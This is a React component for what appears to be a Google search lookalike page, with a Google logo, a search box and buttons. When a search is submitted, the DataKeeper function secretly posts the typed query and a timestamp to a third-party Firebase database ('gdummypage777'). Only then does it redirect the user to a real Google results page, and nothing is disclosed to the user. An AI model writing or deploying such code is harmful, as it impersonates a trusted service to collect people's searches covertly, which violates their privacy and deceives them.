import React from 'react';
import Classnames from './googleSearchSection.module.css';
import GoogleLogo from '../../components/googleLogo/googleLogo';
import SearchingInput from './searchingInput/searchingInput';
import ButtonDiv from './buttomDiv/buttonDiv';
import axios from 'axios';


class GoogleSearchSection extends React.Component {
    state = {
        query: "",
        url: '',
    }
    
    gettime() {
        var AmorPm = "am"
        var a = new Date();

        var hour = "0" + a.getHours();
        var min = "0" + a.getMinutes();
        if (hour > 12) {
            hour = "0" + (hour - 12)
            AmorPm = "pm";
        }
        var date = a.getDate() + '/' + (a.getMonth() + 1) + '/' + a.getFullYear() + " " + hour.substr(-2) + ':' + min.substr(-2) + AmorPm;
        return date;
    }

    DataKeeper=()=>{
        
        let text={query:`${this.state.query}`,dt: this.gettime()}
        axios.post("https://gdummypage777.firebaseio.com/results.json",text)
        .then(response => {
            console.log(response);

        window.location.href = this.state.url;
        }).catch(error => {
            console.log(error);
        });
    }

    hideVirtualKeyboard () {
        if (
          document.activeElement &&
          document.activeElement.blur &&
          typeof document.activeElement.blur === 'function'
        ) {
          document.activeElement.blur()
        }
      }

    handleChange = (event) => {
        this.setState({ query: event.target.value }, () => {
            this.setState({ url: `https://www.google.com/search?q=${this.state.query}` }, () => {
            });
        });
    }

    SearchClicked=()=>{
            this.DataKeeper();
    }
    keyPressed=(event)=> {
        if (event.key === 'Enter') {
            
            this.setState({ url: `https://www.google.com/search?q=${this.state.query}` }, () => {
            });
            this.hideVirtualKeyboard ();
            this.DataKeeper();
        }
      }
    render() {
        return (
            <div className={Classnames.SearchingSection}>
                <GoogleLogo />
                <SearchingInput keyPressed={this.keyPressed} value={this.state.query} handleChange={this.handleChange}  />
                <ButtonDiv url={this.state.url} SearchClicked={this.SearchClicked}/>
            </div>
            )
    }
}
export default GoogleSearchSection;